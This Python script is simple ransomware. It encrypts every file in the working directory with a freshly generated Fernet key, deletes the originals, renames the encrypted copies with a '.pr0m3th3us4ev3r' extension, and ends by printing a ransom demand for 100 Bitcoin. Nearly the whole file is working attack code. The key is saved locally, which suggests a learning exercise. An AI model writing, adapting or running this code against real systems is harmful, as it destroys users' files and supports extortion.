#!/usr/bin/python3

import os
from cryptography.fernet import Fernet

# let's find some files

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "upload.py" or file == 'main.py' or file == 'download.py' or file == 'test.py':
        continue

    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        tempTuple = os.path.splitext(file)
        os.remove(file)
        file = tempTuple[0]
        print(file)
        extension = ".pr0m3th3us4ev3r"
        encrypted_filename = file + extension
        with open(encrypted_filename, "wb") as thefile:
            thefile.write(contents_encrypted)

print("All of your files have been encrypted!! Send me 100 Bitcoin or I'll delete them in 24 hrs!!")